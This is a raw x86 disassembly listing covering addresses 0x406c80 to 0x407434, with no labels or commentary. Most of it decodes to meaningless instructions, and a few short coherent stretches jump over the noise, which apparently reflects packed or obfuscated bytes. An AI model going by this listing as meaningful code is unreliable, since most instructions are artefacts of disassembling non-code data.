  406c80:	arpl   WORD PTR [ebx+edx*8+0x31],si
  406c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c85:	or     ah,BYTE PTR [ebx+eax*4]
  406c88:	dec    esi
  406c89:	push   ds
  406c8a:	sub    BYTE PTR [eax+0x76791345],dl
  406c90:	xchg   DWORD PTR [edi+0x31710595],eax
  406c96:	add    dh,BYTE PTR [esi-0x34765c76]
  406c9c:	shl    BYTE PTR [edi+ebp*8+0x43b150f3],cl
  406ca3:	sti    
  406ca4:	jg     0x406cb2
  406ca6:	fistp  DWORD PTR ds:0x41866cdb
  406cac:	cli    
  406cad:	mov    dl,0xe3
  406caf:	out    dx,al
  406cb0:	scas   al,BYTE PTR es:[edi]
  406cb1:	dec    ecx
  406cb2:	sub    eax,0x88764376
  406cb7:	xlat   BYTE PTR ds:[ebx]
  406cb8:	dec    esp
  406cb9:	ret    
  406cba:	jbe    0x406c7b
  406cbc:	in     eax,0x17
  406cbe:	push   edi
  406cbf:	fbld   TBYTE PTR ds:0x648ec2a2
  406cc5:	jne    0x406cd5
  406cc7:	dec    ebp
  406cc8:	je     0x406cca
  406cca:	stc    
  406ccb:	scas   al,BYTE PTR es:[edi]
  406ccc:	sti    
  406ccd:	adc    dh,BYTE PTR [edx]
  406ccf:	aas    
  406cd0:	(bad)  
  406cd2:	jno    0x406d3a
  406cd4:	sub    DWORD PTR [edx-0x34ab90bf],0x3b
  406cdb:	mov    ds:0x8f10f2f2,al
  406ce0:	test   DWORD PTR [edx+0x1e],eax
  406ce3:	jecxz  0x406cf1
  406ce5:	dec    edi
  406ce6:	ret    0xc357
  406ce9:	pop    edx
  406cea:	nop
  406ceb:	jl     0x406ca7
  406ced:	dec    edx
  406cee:	iret   
  406cef:	addr16 xchg ebp,eax
  406cf1:	or     DWORD PTR [esi],ebp
  406cf3:	rcl    ch,0x6a
  406cf6:	push   es
  406cf7:	jmp    DWORD PTR [ebp+eax*8+0xe]
  406cfb:	div    DWORD PTR [esi+edx*4-0xfe333d7]
  406d02:	pushf  
  406d03:	out    0x17,eax
  406d05:	scas   eax,DWORD PTR es:[edi]
  406d06:	xor    DWORD PTR [edx-0x25a3ea92],0x58779948
  406d10:	rol    DWORD PTR [ecx-0x651b98bc],0xee
  406d17:	jmp    0xd4ba:0xbb90b071
  406d1e:	mov    bh,0x5f
  406d20:	(bad)  
  406d21:	xchg   edx,eax
  406d22:	rcl    ebx,1
  406d24:	adc    eax,ebp
  406d26:	in     al,dx
  406d27:	xchg   esi,eax
  406d28:	into   
  406d29:	jne    0x406d29
  406d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d2c:	bound  ecx,QWORD PTR [edx-0x2d]
  406d2f:	xchg   ebx,eax
  406d30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d31:	loope  0x406d6d
  406d33:	xor    bl,BYTE PTR [eax+0x15]
  406d36:	leave  
  406d37:	fmul   DWORD PTR [eax-0x5eaaf888]
  406d3d:	pop    ds
  406d3e:	ja     0x406cce
  406d40:	jecxz  0x406d03
  406d42:	loope  0x406d62
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x776a0603]
  406db5:	out    dx,al
  406db6:	(bad)  
  406db7:	mov    esi,0x18188b0a
  406dbc:	sahf   
  406dbd:	adc    bl,BYTE PTR [eax]
  406dbf:	sbb    BYTE PTR [eax-0x7e],cl
  406dc2:	mov    ch,0xf8
  406dc4:	or     al,0xe0
  406dc6:	and    eax,0x1b7e218
  406dcb:	(bad)  [esi]
  406dcd:	mov    BYTE PTR [ebp-0x6db7137c],al
  406dd3:	xor    DWORD PTR [edx-0x80],0x803b24c5
  406dda:	push   0x38d4b111
  406ddf:	jg     0x406e5f
  406de1:	out    dx,al
  406de2:	(bad)  
  406de3:	cmp    eax,0xf5b0bae5
  406de8:	and    al,BYTE PTR [eax-0x424a5821]
  406dee:	add    al,0x88
  406df0:	sti    
  406df1:	dec    ecx
  406df2:	dec    ecx
  406df3:	and    edx,esi
  406df5:	lods   al,BYTE PTR ds:[esi]
  406df6:	sbb    bh,ch
  406df8:	pushf  
  406df9:	lods   al,BYTE PTR ds:[esi]
  406dfa:	mov    ds:0x49d0a0a6,al
  406dff:	retf   0xb4b6
  406e02:	jno    0x406dfa
  406e04:	fnsave [ebx+0x53]
  406e07:	add    al,0xdb
  406e09:	push   esp
  406e0a:	fld    QWORD PTR [esi-0x6]
  406e0d:	xchg   DWORD PTR [edi-0x23],esi
  406e10:	jmp    0xcd5f:0x3c789c11
  406e17:	cli    
  406e18:	outs   dx,BYTE PTR ds:[esi]
  406e19:	loope  0x406e4e
  406e1b:	cmp    BYTE PTR [edi],bh
  406e1d:	dec    ebp
  406e1e:	add    bh,BYTE PTR [ebp+0x6]
  406e21:	inc    eax
  406e22:	pusha  
  406e23:	push   cs
  406e24:	loopne 0x406de5
  406e26:	outs   dx,DWORD PTR ds:[esi]
  406e27:	sbb    eax,DWORD PTR [ecx-0x1b253e2d]
  406e2d:	pop    ebx
  406e2e:	adc    edi,DWORD PTR ds:0x7f28a970
  406e34:	dec    edi
  406e35:	test   al,0xd3
  406e37:	gs mov edx,0x9af4272a
  406e3d:	pop    esi
  406e3e:	loope  0x406e9c
  406e40:	out    0xe8,eax
  406e42:	jb     0x406e23
  406e44:	loop   0x406dea
  406e46:	sub    eax,0xb9eb0fb
  406e4b:	or     BYTE PTR [eax+0x1ecc4911],dl
  406e51:	mov    edi,0x59f2545a
  406e56:	dec    esp
  406e57:	call   0xb6bace85
  406e5c:	sub    esi,DWORD PTR [ebx-0x3b]
  406e5f:	push   edx
  406e60:	ficomp WORD PTR [ebx+0x4e]
  406e63:	paddsb mm6,QWORD PTR [ecx+ecx*8+0xfb4bae1]
  406e6b:	dec    BYTE PTR [ecx]
  406e6d:	sar    DWORD PTR [ebp+0x2554731a],0x57
  406e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e75:	adc    dl,BYTE PTR ds:0x44314127
  406e7b:	repnz aam 0xf3
  406e7e:	sub    eax,0x5e537ef2
  406e83:	je     0x406e84
  406e85:	cli    
  406e86:	sbb    BYTE PTR ds:0xe3f5ec03,dh
  406e8c:	cmp    eax,0xb1481d62
  406e91:	or     ch,ch
  406e93:	lock cmc 
  406e95:	sub    ebx,esp
  406e97:	data16 clc 
  406e99:	cmp    ch,BYTE PTR [eax+0x658b4e9b]
  406e9f:	test   BYTE PTR [ecx+0x3d51a389],ah
  406ea5:	and    BYTE PTR [esi],ah
  406ea7:	cmp    ecx,edi
  406ea9:	mov    al,0xfb
  406eab:	push   edi
  406eac:	arpl   WORD PTR ds:0xaded12fa,sp
  406eb2:	aaa    
  406eb3:	mov    edi,DWORD PTR ds:0xc8120a6
  406eb9:	in     al,0xe
  406ebb:	jnp    0x406ef1
  406ebd:	mov    ebp,0xfb71ccf7
  406ec2:	test   BYTE PTR [ecx+ebx*4],ch
  406ec5:	adc    esi,DWORD PTR [edx+ebp*4]
  406ec8:	push   edi
  406ec9:	ret    0x4f9c
  406ecc:	or     DWORD PTR [eax-0x6a1aae55],edx
  406ed2:	mov    ecx,0x6181af
  406ed7:	adc    ecx,esi
  406ed9:	mov    ch,0xd4
  406edb:	dec    ecx
  406edc:	repz (bad) 
  406edf:	push   esp
  406ee0:	and    eax,0x6e26ad73
  406ee5:	mov    eax,ds:0xf11cdac9
  406eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eeb:	(bad)  
  406eec:	sbb    BYTE PTR [ecx],dl
  406eee:	das    
  406eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ef0:	cmp    DWORD PTR [ecx-0xb],ecx
  406ef3:	mov    ecx,0x40acdb8e
  406ef8:	repz cmp dl,BYTE PTR [ebp+0x7]
  406efc:	xor    BYTE PTR [eax],ah
  406efe:	fidiv  WORD PTR ds:0x2d4a4e1c
  406f04:	pushf  
  406f05:	xchg   edi,eax
  406f06:	call   0x1b39cac9
  406f0b:	or     al,0xf1
  406f0d:	adc    esp,edi
  406f0f:	aaa    
  406f10:	sub    al,0xd1
  406f12:	cwde   
  406f13:	jne    0x406f7f
  406f15:	cmp    bl,0xd2
  406f18:	nop    DWORD PTR [edi]
  406f1b:	add    BYTE PTR [ebp+0x34be6c01],bh
  406f21:	je     0x406f9b
  406f23:	loop   0x406f81
  406f25:	scas   eax,DWORD PTR es:[edi]
  406f26:	xor    eax,0x1a47d228
  406f2b:	push   0xfc5b8f11
  406f30:	pop    es
  406f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f32:	retf   
  406f33:	cmp    esi,DWORD PTR [ebp+0x6a]
  406f36:	pop    ss
  406f37:	icebp  
  406f38:	mov    ebx,ecx
  406f3a:	int3   
  406f3b:	outs   dx,BYTE PTR ds:[esi]
  406f3c:	fcmovb st,st(2)
  406f3e:	fbstp  TBYTE PTR [ecx-0x60]
  406f41:	mov    ebx,0x81ed6100
  406f46:	call   0xe5f45d28
  406f4b:	jno    0x406f73
  406f4d:	jg     0x406edb
  406f4f:	shr    DWORD PTR [esi],1
  406f51:	inc    edx
  406f52:	call   0x6373773f
  406f57:	scas   al,BYTE PTR es:[edi]
  406f58:	in     al,0x6e
  406f5a:	mov    WORD PTR [ebx+ebx*8],es
  406f5d:	outs   dx,DWORD PTR ds:[esi]
  406f5e:	stos   DWORD PTR es:[edi],eax
  406f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f60:	and    al,0x4e
  406f62:	dec    esi
  406f63:	aam    0xe0
  406f65:	sbb    BYTE PTR [edi],ch
  406f67:	cmp    BYTE PTR [ebx*1-0x3dd43b52],cl
  406f6e:	into   
  406f6f:	lea    esp,[esi-0xd5f36d5]
  406f75:	nop
  406f76:	or     ah,dh
  406f78:	fistp  QWORD PTR [ebp-0x508bd740]
  406f7e:	mov    ah,0x1c
  406f80:	mov    al,0xd6
  406f82:	pop    ebp
  406f83:	(bad)  ds:0xc49d631
  406f89:	xor    ch,cl
  406f8b:	mov    al,0xc2
  406f8d:	and    BYTE PTR [esp+edx*1+0x60],dl
  406f91:	cwde   
  406f92:	or     edx,DWORD PTR [esi-0x27a63258]
  406f98:	out    dx,al
  406f99:	and    eax,0x47d08528
  406f9e:	jns    0x406f48
  406fa0:	inc    ebp
  406fa1:	pop    ebp
  406fa2:	outs   dx,DWORD PTR ds:[esi]
  406fa3:	mov    ch,0x7f
  406fa5:	jns    0x406fe2
  406fa7:	push   ebx
  406fa8:	ds mov ah,dl
  406fab:	jae    0x406f9b
  406fad:	xchg   esp,eax
  406fae:	push   0x39
  406fb0:	add    al,0xe9
  406fb2:	xchg   DWORD PTR [edi],edi
  406fb4:	(bad)  
  406fb5:	pop    ss
  406fb6:	push   0x11af308b
  406fbb:	lods   al,BYTE PTR ds:[esi]
  406fbc:	jmp    DWORD PTR [eax+0x39]
  406fbf:	ins    BYTE PTR es:[edi],dx
  406fc0:	ja     0x406f8e
  406fc2:	sbb    eax,0x5b599c06
  406fc7:	push   ss
  406fc8:	imul   edx,DWORD PTR [edi-0x54],0x11
  406fcc:	and    eax,DWORD PTR [edx+0xe0a5e1f]
  406fd2:	xchg   ebx,eax
  406fd3:	aam    0xb6
  406fd5:	adc    edx,edx
  406fd7:	mov    ecx,0x64740cc
  406fdc:	sahf   
  406fdd:	ret    
  406fde:	pop    ebp
  406fdf:	dec    edx
  406fe0:	cwde   
  406fe1:	jmp    0x9043:0x27396de6
  406fe8:	and    al,0xaa
  406fea:	jbe    0x406f6e
  406fec:	test   BYTE PTR [ecx+0x69c0fd59],ch
  406ff2:	cmc    
  406ff3:	inc    edi
  406ff4:	(bad)  
  406ff5:	sti    
  406ff6:	pushf  
  406ff7:	mov    ds:0x24c2ad81,eax
  406ffc:	je     0x407022
  406ffe:	out    dx,eax
  406fff:	test   DWORD PTR [edi-0x2706be06],esp
  407005:	scas   eax,DWORD PTR es:[edi]
  407006:	xchg   ecx,eax
  407007:	call   0x6a29f167
  40700c:	(bad)  
  40700d:	scas   al,BYTE PTR es:[edi]
  40700e:	or     DWORD PTR [ebx-0x5d],0x1fa1b04b
  407015:	and    al,0xa8
  407017:	inc    ebx
  407018:	ins    BYTE PTR es:[edi],dx
  407019:	ret    
  40701a:	and    DWORD PTR [edx-0x6b87965f],eax
  407020:	ficom  DWORD PTR [edx-0x64]
  407023:	pop    edx
  407024:	repnz lahf 
  407026:	jnp    0x407043
  407028:	pop    ebx
  407029:	(bad)  
  40702a:	push   esi
  40702b:	and    eax,0xda0436fa
  407030:	push   esp
  407031:	pusha  
  407032:	icebp  
  407033:	(bad)  
  407034:	fadd   QWORD PTR [ebx+0x751cfa41]
  40703a:	add    dh,BYTE PTR [edi-0x4d363cad]
  407040:	pop    es
  407041:	pop    ebp
  407042:	ror    BYTE PTR [esi+0x70],cl
  407045:	xor    dl,BYTE PTR ds:0x3e16b469
  40704b:	sub    BYTE PTR [ebx+eax*2-0x70fc8dd7],ch
  407052:	dec    esi
  407053:	in     eax,dx
  407054:	add    DWORD PTR [ebp+0x42b619f1],0x6b0c0609
  40705e:	mov    edi,0x4940ab84
  407063:	sub    eax,DWORD PTR [esi+0x4]
  407066:	mov    ch,0x43
  407068:	cmp    BYTE PTR [esi-0x66],bl
  40706b:	jecxz  0x407099
  40706d:	std    
  40706e:	ret    0x8f5f
  407071:	clc    
  407072:	add    al,0xc4
  407074:	sbb    eax,0xd32fda17
  407079:	or     BYTE PTR [esi+0x3ffc5a7],ah
  40707f:	ins    DWORD PTR es:[edi],dx
  407080:	outs   dx,DWORD PTR ds:[esi]
  407081:	lock sub dl,BYTE PTR [edi-0x1ec9b6a6]
  407088:	(bad)  [edi]
  40708a:	and    DWORD PTR [edi],edi
  40708c:	scas   eax,DWORD PTR es:[edi]
  40708d:	shl    esi,0x69
  407090:	sub    DWORD PTR [edx-0x40],ebx
  407093:	repnz xor bl,BYTE PTR [ebp-0x61]
  407097:	call   0x3c1d:0x44314af5
  40709e:	jecxz  0x407101
  4070a0:	or     bl,BYTE PTR [edi-0x106d7c16]
  4070a6:	repz mov dl,al
  4070a9:	popf   
  4070aa:	aam    0xb0
  4070ac:	icebp  
  4070ad:	ror    dh,1
  4070af:	mov    al,0x74
  4070b1:	and    al,0xc3
  4070b3:	inc    ebp
  4070b4:	or     DWORD PTR [ebx+0x66],0xe829d14f
  4070bb:	inc    esi
  4070bc:	inc    ebx
  4070bd:	loope  0x4070e0
  4070bf:	inc    ebp
  4070c0:	jp     0x40706b
  4070c2:	sbb    DWORD PTR [eax],ecx
  4070c4:	stc    
  4070c5:	fbstp  TBYTE PTR [edx*4-0x65f0d155]
  4070cc:	xchg   esp,eax
  4070cd:	jo     0x407088
  4070cf:	push   esi
  4070d0:	cmp    esi,edi
  4070d2:	mov    ebx,DWORD PTR [edx]
  4070d4:	pop    es
  4070d5:	ja     0x407098
  4070d7:	out    0xb,al
  4070d9:	or     ebx,edx
  4070db:	sub    DWORD PTR [ebp+0x6ae2fd5b],ebx
  4070e1:	push   esp
  4070e2:	dec    esi
  4070e3:	push   ebx
  4070e4:	push   es
  4070e5:	ficom  WORD PTR [esi+ecx*2]
  4070e8:	sub    al,0x18
  4070ea:	ja     0x407093
  4070ec:	les    esi,FWORD PTR ds:0xc8f89f8c
  4070f2:	data16 aam 0xa5
  4070f5:	jbe    0x4070ae
  4070f7:	xchg   BYTE PTR [edx-0x7f],al
  4070fa:	and    BYTE PTR [esi+0x44],dl
  4070fd:	clc    
  4070fe:	retf   
  4070ff:	inc    BYTE PTR [ecx+0x4df61db3]
  407105:	sub    dl,BYTE PTR [edx]
  407107:	sub    bh,BYTE PTR [edi]
  407109:	inc    ebp
  40710a:	das    
  40710b:	jb     0x40712b
  40710d:	mov    WORD PTR [ecx+ebp*2+0x55a63513],?
  407114:	je     0x40712c
  407116:	mov    esi,0x7f24a490
  40711b:	iret   
  40711c:	dec    ebp
  40711d:	loopne 0x4070d0
  40711f:	je     0x4070f1
  407121:	mov    WORD PTR [edi+0x63de52e9],ds
  407127:	mov    eax,ds:0xdbe47f6b
  40712c:	je     0x4070f8
  40712e:	push   ss
  40712f:	jns    0x407129
  407131:	cmp    ecx,DWORD PTR [edi+0x24]
  407134:	inc    edx
  407135:	(bad)  
  407136:	stos   DWORD PTR es:[edi],eax
  407137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407138:	mov    esi,0xe2c79d08
  40713d:	add    al,0x47
  40713f:	push   ebp
  407140:	and    eax,ebp
  407142:	dec    ebp
  407143:	cs push esi
  407145:	aam    0xa8
  407147:	sbb    BYTE PTR [edx],al
  407149:	ins    BYTE PTR es:[edi],dx
  40714a:	cmp    eax,0xfb09f76c
  40714f:	dec    edi
  407150:	test   DWORD PTR [ebx+0x57],ecx
  407153:	pop    ecx
  407155:	sbb    ebp,edi
  407157:	lea    ecx,ds:0x5ba9f17e
  40715d:	int3   
  40715e:	or     DWORD PTR [esi-0x2d],esp
  407161:	(bad)  
  407163:	sub    eax,0x6ce35e2
  407168:	mov    cl,0xbf
  40716a:	iret   
  40716b:	ins    BYTE PTR es:[edi],dx
  40716c:	into   
  40716d:	xor    BYTE PTR [esi+ecx*2],bl
  407170:	icebp  
  407171:	lods   eax,DWORD PTR ds:[esi]
  407172:	leave  
  407173:	dec    esi
  407174:	adc    DWORD PTR [esi*4-0x19656594],0x32cbac45
  40717f:	add    BYTE PTR [ebx-0x75],bl
  407182:	enter  0xac0f,0xd1
  407186:	add    al,cl
  407188:	loopne 0x4071a8
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	outs   dx,BYTE PTR ds:[esi]
  4071c5:	and    al,0x41
  4071c7:	mov    esi,0x18188590
  4071cc:	sahf   
  4071cd:	adc    bl,BYTE PTR [eax]
  4071cf:	sbb    BYTE PTR [eax],ch
  4071d1:	das    
  4071d2:	scas   al,BYTE PTR es:[edi]
  4071d3:	idiv   BYTE PTR [esp+ebp*1-0x744d4b2e]
  4071da:	dec    edx
  4071db:	aaa    
  4071dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071dd:	aas    
  4071de:	adc    bh,BYTE PTR [eax+0x15]
  4071e1:	(bad)  
  4071e2:	mov    esp,0x50e23038
  4071e7:	stos   BYTE PTR es:[edi],al
  4071e8:	or     ecx,DWORD PTR [edx-0x50]
  4071eb:	std    
  4071ec:	push   edx
  4071ed:	mov    BYTE PTR [edi+0x64],0x89
  4071f1:	cmp    al,0xe8
  4071f3:	or     eax,0x6b321c52
  4071f8:	xchg   DWORD PTR [ebx],eax
  4071fa:	cmp    DWORD PTR [ecx+0x78],esp
  4071fd:	lds    esi,FWORD PTR [edi+0x5a]
  407200:	outs   dx,DWORD PTR ds:[esi]
  407201:	cmp    DWORD PTR [edi+ebp*2+0x69],ecx
  407205:	mov    edx,0xc4c46f07
  40720a:	ss js  0x4071a0
  40720d:	fstp   DWORD PTR [eax+0x20]
  407210:	add    bh,BYTE PTR [esi+ebx*8-0x43]
  407214:	and    BYTE PTR [ebx-0x31],dl
  407217:	ins    DWORD PTR es:[edi],dx
  407218:	into   
  407219:	mov    eax,0xcd99ce9d
  40721e:	xchg   esp,eax
  40721f:	test   al,0x86
  407221:	cmp    ebx,DWORD PTR [edx+0x72884ea0]
  407227:	imul   ebx,DWORD PTR gs:[ebx],0x79e31d36
  40722e:	stos   BYTE PTR es:[edi],al
  40722f:	outs   dx,BYTE PTR ds:[esi]
  407230:	mov    dl,BYTE PTR [ecx+edx*2]
  407233:	push   cs
  407234:	ja     0x4071e6
  407236:	mov    DWORD PTR [ebp+0x19],esp
  407239:	push   es
  40723a:	jecxz  0x407270
  40723c:	jnp    0x4071be
  40723e:	add    al,0x33
  407240:	fdivr  QWORD PTR [edi+0x31581dd6]
  407246:	imul   edx,DWORD PTR [ebx],0xffffffdb
  407249:	test   DWORD PTR [esi-0x2b52332f],esi
  40724f:	dec    esp
  407250:	jge    0x4072b9
  407252:	mov    bh,BYTE PTR [eax-0x5edd5cfa]
  407258:	push   eax
  407259:	adc    ch,ch
  40725b:	cmp    al,bl
  40725d:	dec    esi
  40725e:	xor    BYTE PTR [edi+0x2a],dh
  407261:	xchg   esp,eax
  407262:	cwde   
  407263:	fnsave [ebx-0x41]
  407266:	mov    ebx,0x44cedee7
  40726b:	fisttp WORD PTR [edi]
  40726d:	sbb    al,BYTE PTR [edx+0x14]
  407270:	outs   dx,BYTE PTR ds:[esi]
  407271:	dec    DWORD PTR [ecx]
  407273:	and    edi,esp
  407275:	fmul   DWORD PTR [ecx-0x52]
  407278:	sbb    cl,BYTE PTR [ebx-0x995ba9d]
  40727e:	jae    0x407229
  407280:	mov    eax,ds:0x67fbb854
  407285:	shl    edi,0xb3
  407288:	or     ebp,DWORD PTR [esi]
  40728a:	xchg   ebp,eax
  40728b:	loop   0x40723d
  40728d:	call   0x1599:0x92d63171
  407294:	mov    ebp,0x54b9241a
  407299:	jmp    DWORD PTR [esi]
  40729b:	retf   0x601
  40729e:	dec    esp
  40729f:	jmp    0x6a83:0xacf4e151
  4072a6:	and    eax,0xa7c0e570
  4072ab:	add    dl,BYTE PTR [edi+0x69af6039]
  4072b1:	jecxz  0x407272
  4072b3:	sbb    esi,DWORD PTR [edi-0x39]
  4072b6:	or     BYTE PTR [edx],bh
  4072b8:	mov    cl,BYTE PTR [esp+ebx*2]
  4072bb:	push   esp
  4072bc:	dec    ebp
  4072bd:	dec    ecx
  4072be:	fild   QWORD PTR [ebp+0x1d2bd441]
  4072c4:	dec    eax
  4072c5:	sub    edx,DWORD PTR [ebx]
  4072c7:	aaa    
  4072c8:	cmp    al,BYTE PTR ds:[edx-0x18cfbce0]
  4072cf:	dec    ebp
  4072d0:	clc    
  4072d1:	mov    al,ds:0x540bb5f
  4072d6:	xchg   BYTE PTR ds:0x16350865,ch
  4072dc:	sub    al,0x16
  4072de:	mov    ch,0x89
  4072e0:	les    edi,FWORD PTR [eax+0x68]
  4072e3:	(bad)  
  4072e4:	mov    ecx,0x6bbd9cab
  4072e9:	mov    ebx,0xe35af47c
  4072ee:	fcomip st,st(4)
  4072f0:	fdivr  DWORD PTR [eax+ebx*2-0x49]
  4072f4:	(bad)  
  4072f5:	and    BYTE PTR [eax],ah
  4072f7:	fidiv  WORD PTR [ecx-0x6b0ce4a]
  4072fd:	addr16 int3 
  4072ff:	addr16 xor eax,0x2f2a28da
  407305:	cmp    eax,0xbd839924
  40730a:	icebp  
  40730b:	aam    0x8c
  40730d:	push   0xffffffca
  40730f:	mov    ebp,0x533820da
  407314:	cli    
  407315:	add    ebx,DWORD PTR [eax]
  407317:	adc    DWORD PTR [ebx+ebx*2-0x71],edi
  40731b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40731c:	retf   
  40731d:	mov    ebx,0xaff593be
  407322:	sub    dl,BYTE PTR [eax]
  407324:	lods   eax,DWORD PTR ds:[esi]
  407325:	jmp    0x407385
  407327:	mov    eax,0x24353c2c
  40732c:	and    eax,0x5c634e51
  407331:	lock inc edx
  407333:	mov    ebp,0xd8eede6c
  407338:	sub    ch,BYTE PTR [edx]
  40733a:	popa   
  40733b:	fimul  DWORD PTR [ebx+edi*2]
  40733e:	imul   ebp,edx,0x7c5f83de
  407344:	std    
  407345:	jmp    0x1fa7ab18
  40734a:	and    dh,BYTE PTR [esi]
  40734c:	not    DWORD PTR [esi]
  40734e:	sbb    eax,0x629621df
  407353:	outs   dx,BYTE PTR ds:[esi]
  407354:	push   edx
  407355:	scas   eax,DWORD PTR es:[edi]
  407356:	push   edi
  407357:	mov    al,0xff
  407359:	inc    esi
  40735a:	std    
  40735b:	out    0x7b,al
  40735d:	jns    0x4073d3
  40735f:	popa   
  407360:	adc    ch,BYTE PTR [ecx-0x6402fe8e]
  407366:	iret   
  407367:	das    
  407368:	sub    eax,0xb7b82e73
  40736d:	jae    0x4073b6
  40736f:	arpl   WORD PTR [esi+0x4092302d],dx
  407375:	enter  0x8c88,0x86
  407379:	enter  0xd8c9,0x9f
  40737d:	loope  0x407336
  40737f:	sti    
  407380:	dec    ecx
  407381:	test   al,0x9d
  407383:	xor    BYTE PTR [ecx+esi*1-0x21e19d5f],dl
  40738a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40738b:	pop    ebp
  40738c:	clc    
  40738d:	out    dx,al
  40738e:	push   ss
  40738f:	mov    dl,0xde
  407391:	(bad)  
  407392:	mov    esi,0x8a91a9c3
  407397:	fstp   QWORD PTR [edx+0x6f]
  40739a:	in     eax,0x41
  40739c:	scas   al,BYTE PTR es:[edi]
  40739d:	xchg   ebx,eax
  40739e:	jg     0x4073b1
  4073a0:	popf   
  4073a1:	jb     0x407393
  4073a3:	test   BYTE PTR [ecx],ah
  4073a5:	test   BYTE PTR [ecx-0x76],dl
  4073a8:	push   esp
  4073a9:	cwde   
  4073aa:	sti    
  4073ab:	sub    BYTE PTR [esi],ch
  4073ad:	jp     0x4073b9
  4073af:	lods   al,BYTE PTR ds:[esi]
  4073b0:	cmp    eax,0x2c9fb621
  4073b5:	in     al,0x2e
  4073b7:	loop   0x4073f6
  4073b9:	push   edi
  4073ba:	dec    ebp
  4073bb:	in     eax,dx
  4073bc:	mov    dl,0xc6
  4073be:	mov    al,0xe2
  4073c0:	add    al,0x2c
  4073c2:	xchg   edi,eax
  4073c3:	clc    
  4073c4:	mov    ch,BYTE PTR [edi-0x49fa91cb]
  4073ca:	mov    ebx,0xb86ee502
  4073cf:	iret   
  4073d0:	push   0x22e5e134
  4073d5:	push   edi
  4073d6:	xchg   edx,eax
  4073d7:	outs   dx,DWORD PTR ds:[esi]
  4073d8:	xchg   ecx,eax
  4073d9:	sbb    BYTE PTR gs:[ecx-0x3a67838],ah
  4073e0:	jle    0x4073a5
  4073e2:	idiv   BYTE PTR [edi+0x1dbbe87c]
  4073e8:	repz retf 0xb698
  4073ec:	adc    cl,BYTE PTR [esp+eiz*2+0x3c]
  4073f0:	test   DWORD PTR [ebx-0x71],edx
  4073f3:	jmp    0x2f6ab34e
  4073f8:	jo     0x407427
  4073fa:	jb     0x4073b4
  4073fc:	sub    DWORD PTR es:[ebx],0x2e
  407400:	inc    ebx
  407401:	fxch   st(4)
  407403:	test   BYTE PTR [esi+0x42424e5f],al
  407409:	iret   
  40740a:	sbb    bh,BYTE PTR [edx]
  40740c:	loop   0x4073a5
  40740e:	sub    DWORD PTR [ecx-0x4a5185e9],ecx
  407414:	and    ah,cl
  407416:	mov    edx,0xec3ebca9
  40741b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40741d:	in     al,0x72
  40741f:	shl    DWORD PTR [esi+ebx*1],cl
  407422:	pop    eax
  407423:	ret    0xa5b0
  407426:	jno    0x4074a6
  407428:	and    BYTE PTR [ebx+0x33],0x1b
  40742c:	inc    edi
  40742d:	fcmovnb st,st(6)
  40742f:	cmc    
  407430:	leave  
  407431:	fnstsw WORD PTR [ebp+0x7f]
  407434:	loop   0x40741e
